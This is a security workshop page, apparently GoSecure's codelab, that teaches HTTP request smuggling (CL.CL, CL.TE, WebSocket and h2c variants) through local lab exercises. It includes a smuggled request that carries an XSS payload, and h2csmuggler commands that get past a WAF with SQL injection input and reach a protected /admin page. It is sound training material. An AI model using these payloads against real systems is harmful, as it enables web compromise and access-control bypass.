
<!doctype html>

<html>
<head>
  <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, user-scalable=yes">
  <meta name="theme-color" content="#4F7DC9">
  <meta charset="UTF-8">
  <title>Introduction to Request Smuggling</title>
  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
  <link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
  <link rel="stylesheet" href="https://storage.googleapis.com/codelab-elements/codelab-elements.css">
  <style>
    .success {
      color: #1e8e3e;
    }
    .error {
      color: red;
    }
  </style>
</head>
<body>
  <google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
  <google-codelab codelab-gaid="UA-153352998-3"
                  id="request-smuggling-workshop"
                  title="Introduction to Request Smuggling"
                  environment="web"
                  feedback-link="https://github.com/GoSecure/request-smuggling-workshop/issues">
    
      <google-codelab-step label="Introduction" duration="5">
        <p class="image-container"><img alt="HTTP Request Smuggling Workshop" src="img\\6e6e354ad1ccaeec.png"></p>
<p>Welcome to the workshop segment of this presentation on Request Smuggling. Now is the time to put the theory discussed into practice.</p>
<p>At the end of the workshop, you will be familiar with four attack variants of HTTP Request Smuggling. You will also have a test environment to experiment further with the attack. All the custom applications and system configurations are open-source.</p>
<h2 is-upgraded>Requirements</h2>
<p>The only requirement is to have an HTTP interception proxy installed. BurpSuite is the only one recommended  for its support for HTTP2.</p>
<ul>
<li><a href="https://portswigger.net/burp" target="_blank">Burp Suite</a></li>
</ul>
<h2 is-upgraded>Running the applications</h2>
<p>To do the exercises, you will need to run the <a href="https://github.com/GoSecure/request-smuggling-workshop" target="_blank">lab applications</a> by yourself. All applications were built with a docker container recipe. This should make the deployment easier.</p>
<ol type="1">
<li>Download the code. <br><code>$ git clone https://github.com/GoSecure/request-smuggling-workshop<br></code></li>
<li>Read build instructions (<code>/README.md</code>) from each application. This step will differ for each application.</li>
<li>Use docker-compose to start the application. <br><code>$ docker-compose up<br></code></li>
</ol>
<h2 is-upgraded>Optional DNS configuration</h2>
<p>In order to make the links work, you can optionally add an entry to your local host file. (<code>/etc/hosts</code> or <code>C:\Windows\system32\drivers\etc\hosts</code>)</p>
<pre><code>127.0.0.1   request-smuggling.gosec.co
</code></pre>
<h2 is-upgraded>Video presentation</h2>
<p>You can watch the complete workshop on video. From the video, you will be able to listen to all the tutorials and see the demonstrations for all exercises. Open the <a href="https://youtu.be/XXXXXXXXXXXXX" target="_blank">YouTube page in a new window</a> to see the chapters.</p>


      </google-codelab-step>
    
      <google-codelab-step label="Intro: HTTP Tunneling" duration="6">
        <h2 is-upgraded>HTTP protocol evolution key changes</h2>
<p>In early versions of HTTP (version 1.0 and before), every request is one TCP connection. This method was enough to support simple HTML websites. However, a sophisticated website will required external resources such as images and JavaScript causing numerous TCP handshakes.</p>
<p>Version 1.1 aimed to improved those weekness. HTTP/1.1 uses by default persistent connections to transmit multiples requests. This version also introduces the <code>Transfer-Encoding</code> header which is key to some HRS attacks. <em>(It will be explained later)</em></p>
<p class="image-container"><img alt="HTTP Pipeline" src="img\\7ff6991267f25526.png"></p>
<h2 is-upgraded>Multiple requests in the same TCP socket</h2>
<p>When a client is requesting multiple resources (Javascript, Images, Pages, Ajax requests), requests can follow each other in the same TCP socket. The outgoing stream would look like the code below.</p>
<pre><code>GET /index.php HTTP/1.1
Host: myapp.com
Content-Length: 0

POST /login HTTP/1.1
Host: myapp.com
Content-Length: 33

username=admin&amp;password=i&lt;3intent
GET /logo.gif HTTP/1.1
Host: myapp.com
Content-Length: 0
</code></pre>
<p>How does the server know where a request ends and a new request starts? Easy. A request is made up of a header section and a body section. The headers can have any length and are terminated by <code>\r\n</code>. The body section has variable length. In the previous outgoing stream, the server can determine the size of the body section using the <code>Content-Length</code> header.</p>
<h2 is-upgraded>Where is the confusion?</h2>
<p>The confusion appears when the proxy and the backend server do not agree on the size of each request. This is because these systems may have HTTP parsers that have a slightly different implementation. As soon as a parser is more flexible when implementing the protocol, it can potentially be abused.</p>
<p>In a typical scalable web infrastructure, a proxy will place in front of the backend. The proxy is forwarding a request to the backend with the intent to add functionality such as caching, firewall, or load balancing.</p>
<p class="image-container"><img alt="Proxy Backend Infrastructure" src="img\\217b540954d553d9.png"></p>


      </google-codelab-step>
    
      <google-codelab-step label="Intro: HRS evolution" duration="2">
        <p>The research on HRS has evolved over the past 15 years. While this vulnerability class is not exactly new, most of the development on the topic happens from 2019 to 2021.</p>
<h2 is-upgraded>Key researches</h2>
<h3 is-upgraded>2004: <a href="https://dl.packetstormsecurity.net/papers/general/whitepaper_httpresponse.pdf" target="_blank">HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics</a></h3>
<p><em>by Amit Klein</em></p>
<p>This first paper demonstrates the impact of desynchronizing response in an HTTP stream. While this is not Request Smuggling per say, it has very similar effects and impacts.</p>
<h3 is-upgraded>2005: <a href="https://doc.lagout.org/Others/EN-HTTP-Request-Smuggling.pdf" target="_blank">HTTP request smuggling</a></h3>
<p><em>by Chaim Linhart, Amit Klein, Ronen Heled and Steve Orrin</em></p>
<p>The &#34;HTTP Request Smuggling&#34; paper was the first to document the impacts of desynchronizing the HTTP pipeline. Those impacts include Web Cache Poisoning, Firewall/IPS/IDS evasion and Request Hijacking.</p>
<h3 is-upgraded>2016: <a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf" target="_blank">Hiding Wookiees in HTTP</a></h3>
<p><em>by Regis Leroy (@regilero)</em></p>
<p>Multiple new variants were presented including newline confusion <code>\n</code> / <code>\r\n</code>, HTTP 0.9, typo in <code>Transfer-Encoding</code>, integer overflow for <code>Content-Length</code> and attribute truncation. The tool HTTPWookie was release to test proxies.</p>
<h3 is-upgraded>2019: <a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank">HTTP Desync Attacks: Request Smuggling Reborn</a></h3>
<p><em>by James Kettle</em></p>
<p>In this article and research, James Kettle identifies numerous variations with the header <code>Transfer-Encoding</code>. Along the paper release, a Burp plugin named <a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646" target="_blank">HTTP Request Smuggler</a> was released.</p>
<h3 is-upgraded>2019: <a href="https://github.com/0ang3el/websocket-smuggle" target="_blank">Smuggling HTTP requests over fake WebSocket connection</a></h3>
<p><em>by Mikhail Egorov (@0ang3el)</em></p>
<p>This research introduces a very different approach to request smuggling. It does not involve a complete desynchronization of HTTP tunneling. Instead, it hides an HTTP/1.1 request inside an &#34;invalid&#34; WebSocket stream.</p>
<h3 is-upgraded>2020: <a href="https://bishopfox.com/blog/h2c-smuggling-request" target="_blank">h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)</a></h3>
<p><em>by Jake Miller (@theBumbleSec)</em></p>
<p>Inspired by the WebSocket technique, Jake Miller found a new variant that abuse the capabilities of some backend application to support HTTP2 Cleartext protocol. This mode is started as a HTTP/1 over TLS. It then switches to a HTTP/2 after an upgrade request similar to the one used in WebSocket communication.</p>
<h3 is-upgraded>2021: <a href="https://portswigger.net/research/http2" target="_blank">HTTP/2: The Sequel is Always Worse</a></h3>
<p><em>by James Kettle</em></p>
<p>This recent development introduces implementation mistakes from a proxy that proxy from HTTP/2 to HTTP/1. The support for TLS or HTTP2 is often delegated to the load balancer. This facilitate the deployment of web applications. If the web application containers (NodeJS, .NET core, Jetty, Tomcat, etc) does not support HTTP/2, the proxy needs to convert HTTP/2 request headers to the HTTP/1 protocol. This conversion is subject to error if the HTTP/2 are not validated strictly.</p>


      </google-codelab-step>
    
      <google-codelab-step label="HTTP/1.1 CL.CL" duration="6">
        <h2 is-upgraded>Duplicate Content-Length (CL.CL)</h2>
<p>The first edge case that was documented was the use of two <code>Content-Length</code> headers with conflicting values. This cause issue when the proxy and the backend do not use the same value. How can this be possible? Because the parsers are implemented differently, one implementation might keep the last seen header while an other could keep the first one.</p>
<p><em>Implementation where the last value is kept</em></p>
<pre><code language="language-python" class="language-python">headers = {}
for line : httpRequest
    parts = line.split(&#34;:&#34;)
    headers[parts[0]] = parts[1]
</code></pre>
<p><em>Implementation where the first value is kept</em></p>
<pre><code language="language-python" class="language-python">headers = {}
for line : httpRequest
    parts = line.split(&#34;:&#34;)
    if(parts[0] in headers): #Does not override existing value
        headers[parts[0]] = parts[1]
</code></pre>
<h2 is-upgraded>What each party sees in a CL.CL attack</h2>
<p>The proxy <strong>use the first</strong> header:</p>
<p class="image-container"><img alt="HRS: Sees first Content-Length" src="img\\c1f562fb1c053265.png"></p>
<p>The backend application <strong>use the last</strong> header:</p>
<p class="image-container"><img alt="HRS: Sees last Content-Length" src="img\\eac5cef1b0e1aa11.png"></p>
<h2 is-upgraded>Cache poisoning</h2>
<p>In the diagram below, we can see that proxy is not interpreting the correct resource served by the web application.</p>
<p class="image-container"><img alt="Cache poisoning" src="img\\2c39fbd6b3252fe1.png"></p>
<h2 is-upgraded>There is more...</h2>
<p>This scenario is probably the easiest to understand. This is why it was presented first. However, the length of the request is <strong>not defined only by Content-Length</strong>. HTTP has evolved greatly and has multiple headers that cover similar features.</p>


      </google-codelab-step>
    
      <google-codelab-step label="HTTP/1.1 CL.TE" duration="6">
        <h2 is-upgraded>HTTP/1.1 Content-Length Transfer-Encoding (CL.TE)</h2>
<p><code>Content-Length</code> is not the only one that can be used in an HTTP/1.1 request.</p>
<h2 is-upgraded>Chunked encoding</h2>
<p>&#34;Chunked encoding is useful when larger amounts of data are sent to the client and the total size of the response may not be known until the request has been fully processed.&#34;</p>
<p>Ref: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding" target="_blank">Mozilla.org: Transfer-Encoding</a></p>
<p>It can be used to serve large files generated on the fly. An example can be seen below. The length is in hexadecimal followed by the bytes &#34;chunk&#34;.</p>
<pre><code>HTTP/1.1 200 OK
Content-Type: text/plain
Transfer-Encoding: chunked

5\r\n
Hello\r\n
8\r\n
NorthSec\r\n
B\r\n
Conference!\r\n
0\r\n
\r\n
</code></pre>
<p>The same transfer-encoding type can be used to format the request.</p>
<pre><code>POST /index.php HTTP/1.1
Host: myapp.com
Transfer-Encoding: chunked

5\r\n
Hello\r\n
8\r\n
NorthSec\r\n
B\r\n
Conference!\r\n
0\r\n
\r\n
</code></pre>
<h2 is-upgraded>Content-Length vs Transfer-Encoding</h2>
<p>The server now has an additional dilemma if both <code>Content-Length</code> and <code>Transfer-Encoding</code>. Luckily, the HTTP/1.1 RFC is describing the expected scenario.</p>
<p>&#34;If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.&#34; Ref: <a href="https://datatracker.ietf.org/doc/html/rfc2616" target="_blank">RFC2616 - HTTP/1.1</a></p>
<p><code>Transfer-Encoding</code> must be used first.</p>
<aside class="warning"><p>However <code>Transfer-Encoding</code> might not be supported by both services. In 2021, that would be a major oversight.</p>
</aside>


      </google-codelab-step>
    
      <google-codelab-step label="LAB 1: HTTP/1.1 CL.TE" duration="20">
        <p>Open <code>http://simplewebsite.gosec.co</code> in a browser to confirm that everything is running.</p>
<h2 is-upgraded>HRS detection</h2>
<p>The following request need to repeated ~10 times until you get <code>405 Not Allowed</code> (Method not allowed)</p>
<pre><code>POST / HTTP/1.1
Host: simplewebsite.gosec.co
Content-Length: 79
Transfer-Encoding: chunked

0

G
</code></pre>
<aside class="warning"><p>We need to repeated the following request multiple times. It is a</p>
</aside>
<h2 is-upgraded>Finding a XSS vector</h2>
<p>There are two main vectors to execute Javascript on a system vulnerable to HRS.</p>
<ul>
<li>Causing an open-redirect</li>
<li>Transforming a reflected XSS in a persistent XSS.</li>
</ul>
<h2 is-upgraded>From limited to persistent XSS</h2>
<p>Injecting an HTTP request in the proxy pipeline.</p>
<pre><code>POST / HTTP/1.1
Host: simplewebsite.gosec.co
Content-Length: 79
Transfer-Encoding: chunked

0

GET /contact.php?test=123&#34;&gt;&lt;img/src=&#34;xx&#34;onerror=&#34;alert(1)&#34;&gt; HTTP/1.1
Foo:
</code></pre>
<p>Once this is sent. Refresh the home page or any page on the website until it is placed after the previous malicious request. You should see the XSS trigger.</p>


      </google-codelab-step>
    
      <google-codelab-step label="LAB 2: HTTP/2 (TODO)" duration="20">
        

      </google-codelab-step>
    
      <google-codelab-step label="WebSocket HRS" duration="0">
        <h2 is-upgraded>Web Socket in a nutshell</h2>
<p>WebSocket communication is full-duplex communication that takes place inside a HTTP/1. While typical HTTP/1 messages can be sent in full-duplex, classic HTTP require all messages to have a headers and body section. WebSocket allows lightweight communication along with the control over the Socket with Javascript.</p>
<p class="image-container"><img alt="h2c sequence diagram" src="img\\831e0a0bd13d2ca8.png"></p>
<h2 is-upgraded>Request Smuggling opportunity</h2>
<p>It would not be possible to pass an HTTP/1 request once the WebSocket protocol has been established. Once the upgrade is done the receiving application will see incoming traffic as bytes. (Add note regarding encryption)</p>
<p>It is however possible to initiate an incomplete Upgrade request that would fail. If the proxy has a &#34;naive&#34; WebSocket support implementation, it will not at the server response to evaluate if the upgrade succeeds. Using this request fails, it is now possible to pass an additional request to the server. Since it is not in WebSocket mode, it will process the following byte stream as normal HTTP/1.</p>
<p><strong>References:</strong></p>
<ul>
<li><a href="https://github.com/0ang3el/websocket-smuggle" target="_blank">Smuggling HTTP requests over fake WebSocket connection</a> by 0ang3el</li>
</ul>


      </google-codelab-step>
    
      <google-codelab-step label="LAB 3: WebSocket" duration="20">
        

      </google-codelab-step>
    
      <google-codelab-step label="HTTP/4 Upgrade to HTTP/2 cleartext" duration="6">
        <p>HTTP 2 Cleartext, shorten to h2c, is the protocol upgrade a connection from HTTP version 1 to HTTP version 2. The operation is done without closing the TCP socket.</p>
<h2 is-upgraded>HTTP 2 Handshake Sequence</h2>
<p class="image-container"><img alt="h2c sequence diagram" src="img\\9c1af04a41ae7fe4.png"></p>
<h2 is-upgraded>Potential abuses</h2>
<p>Just like the technique with the WebSocket upgrade, it is possible to create a request that will not be analyzed by the load balancer. Any special processing such as URL filtering could be bypassed.</p>
<p>It can also be an opportunity for an attacker to bypass a Web Application Firewall. We are going to this scenario in practice in the fourth exercise.</p>
<p><strong>References:</strong></p>
<ul>
<li>https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c</li>
<li>https://blog.assetnote.io/2021/03/18/h2c-smuggling/</li>
<li>https://portswigger.net/daily-swig/h2c-smuggling-proves-effective-against-azure-cloudflare-access-and-more</li>
</ul>


      </google-codelab-step>
    
      <google-codelab-step label="LAB 4: Upgrade to HTTP/2 cleartext" duration="25">
        <h2 is-upgraded>Scenario 1: Bypassing WAF</h2>
<p>Visit <code>http://localhost:8001/movie_detail?id=1</code>. If you attempt to tamper with the parameter <code>id</code>, you will see that it is filtered by a Web Application Firewall. In this case, NAXSI is configured in front of the web application. Exploiting some vulnerabilities can be much harder <em>(see impossible)</em> when a strong firewall is in place. By default, NAXSI is configured to block all quotes <code>'</code> characters. However, with the HTTP 2 Cleartext passthrough we just learned, it is possible to send requests that would not be seen by the firewall.</p>
<h2 is-upgraded>Validation</h2>
<p>First, we need to validate that HTTP2 cleartext is supported by the backend. If the backend application does not support it, this technique will not work.</p>
<pre><code>python h2csmuggler.py -x https://127.0.0.1:8443 -t
[INFO] h2c stream established successfully.
[INFO] Success! https://127.0.0.1:8002 can be used for tunneling
</code></pre>
<h2 is-upgraded>Exploitation</h2>
<p>When testing for SQL injection, a tester will be blocked right away by the Web Application Firewall in place.</p>
<p><code>http://127.0.0.1/movie?id=1'</code> (see single quote at the end)</p>
<p class="image-container"><img alt="NAXSI" src="img\\1720e65486903174.png"></p>
<p>We can use the HTTP2 technique to establish an HTTP tunnel with the application directly that will not be interpreted by most proxies.</p>
<pre><code>python h2csmuggler.py -x https://127.0.0.1:8443 &#34;http://127.0.0.1/movie?id=1&#39;&#34;
[INFO] h2c stream established successfully.
:status: 200
[...]
[INFO] Requesting - /movie?id=1&#39;
[...]
</code></pre>
<pre><code>python h2csmuggler.py -x https://127.0.0.1:8443 &#34;https://127.0.0.1/?genre=action&#39; or &#39;&#39;=&#39;&#34;
[INFO] h2c stream established successfully.
:status: 200
[...]
[INFO] Requesting - /movie?id=1&#39;
[...]
</code></pre>
<h2 is-upgraded>Scenario 2: Acessing forbidden /admin page</h2>
<p>The same infrastructure to test proxy-level access bypass. The application has an administrative page that is intended only for system administrators. The control is enforced by the proxy. Therefore, if one request is not interpreted by the proxy, the access control will not be enforced.</p>
<pre><code>python h2csmuggler.py -x https://127.0.0.1:8001 http://127.0.0.1/admin&#39;
[INFO] h2c stream established successfully.
:status: 200
[...]
[INFO] Requesting - /admin&#39;
[...]
</code></pre>
<p>This lab allows you to exploit the same vulnerability on 3 proxies.</p>
<table>
<tr><td colspan="1" rowspan="1"><p>TCP port</p>
</td><td colspan="1" rowspan="1"><p>Description</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>8001</p>
</td><td colspan="1" rowspan="1"><p>HAProxy -&gt; h2c backend (Insecure default configuration)</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>8002</p>
</td><td colspan="1" rowspan="1"><p>nginx -&gt; h2c backend  (Insecure custom configuration)</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>8003</p>
</td><td colspan="1" rowspan="1"><p>Nuster -&gt; HAProxy -&gt; h2c backend (Insecure configuration with multiple layers of proxies)</p>
</td></tr>
</table>
<p>Changing the port to 8002 and 8003 can confirm that these two others servers are also vulnerable.</p>
<aside class="special"><p>Don&#39;t forget that the second URL use the port exposed by the web application on the <em>internal network</em>. It might not be 80. You can try port such as <code>5000</code>, <code>8000</code> and <code>8080</code>.</p>
</aside>


      </google-codelab-step>
    
      <google-codelab-step label="Conclusion" duration="2">
        <p>Request Smuggling is a vulnerability that had numerous new developments in recent history. It will continue to exist as long as new variations are found and new HTTP parsers are implemented with similar mistakes.</p>
<p>If you are interested in testing your application infrastructure, <a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646" target="_blank">HTTP Request Smuggler</a> seems to be the most complete test suite at the moment.</p>
<p>If you like the format of this workshop, we have produced three free workshops that can also be completed at your pace.</p>
<p><a href="https://gosecure.github.io/xxe-workshop/" target="_blank"><img alt="XXE Workshop" src="img\\b24171361cccb5ea.png"></a> <a href="https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/" target="_blank"><img alt="Binary Analysis Workshop" src="img\\2a5e6e709ef3d3c7.png"></a> <a href="https://gosecure.github.io/template-injection-workshop/" target="_blank"><img alt="Template Injection Workshop" src="img\\4889f8a64bc5cd91.png"></a></p>
<h2 is-upgraded>Documentation References</h2>
<ul>
<li>Watchfire Paper: <a href="https://doc.lagout.org/Others/EN-HTTP-Request-Smuggling.pdf" target="_blank">HTTP request smuggling</a> by Chaim Linhart, Amit Klein, Ronen Heled and Steve Orrin</li>
<li><a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf" target="_blank">Hiding Wookiees in HTTP</a> by Regis Leroy (@regilero)</li>
<li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank">HTTP Desync Attacks: Request Smuggling Reborn</a> by James Kettle</li>
<li><a href="https://portswigger.net/research/http2" target="_blank">HTTP/2: The Sequel is Always Worse</a> by James Kettle</li>
<li><a href="https://bishopfox.com/blog/h2c-smuggling-request" target="_blank">h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)</a> by Jake Miller (@theBumbleSec)</li>
<li><a href="https://github.com/0ang3el/websocket-smuggle" target="_blank">Smuggling HTTP requests over fake WebSocket connection</a> by Mikhail Egorov (@0ang3el)</li>
</ul>
<h2 is-upgraded>Credits for code used in the infrastructure</h2>
<p>This workshop was create based on open-source projects and samples.</p>
<ul>
<li><a href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/#toc5" target="_blank">Docker samples for Apache Traffic Server</a> by Regis Leroy <a href="https://twitter.com/regilero" target="_blank">@regilero</a></li>
<li><a href="https://github.com/0ang3el/websocket-smuggle" target="_blank">HRS WebSocket POC</a> by Mikhail Egorov <a href="https://twitter.com/0ang3el" target="_blank">@0ang3el</a></li>
<li><a href="https://github.com/BishopFox/h2csmuggler" target="_blank">HRS HTTP/2 Cleartext POC</a> by Jake Miller (BishopFox) <a href="https://twitter.com/thebumblesec?lang=en" target="_blank">@thebumblesec</a></li>
<li><a href="https://github.com/Netflix/zuul" target="_blank">Zuul code sample</a> by Various Zuul/Netflix Developpers</li>
</ul>


      </google-codelab-step>
    
  </google-codelab>

  <script src="https://storage.googleapis.com/codelab-elements/native-shim.js"></script>
  <script src="https://storage.googleapis.com/codelab-elements/custom-elements.min.js"></script>
  <script src="https://storage.googleapis.com/codelab-elements/prettify.js"></script>
  <script src="https://storage.googleapis.com/codelab-elements/codelab-elements.js"></script>
  <script src="//support.google.com/inapp/api.js"></script>

</body>
</html>
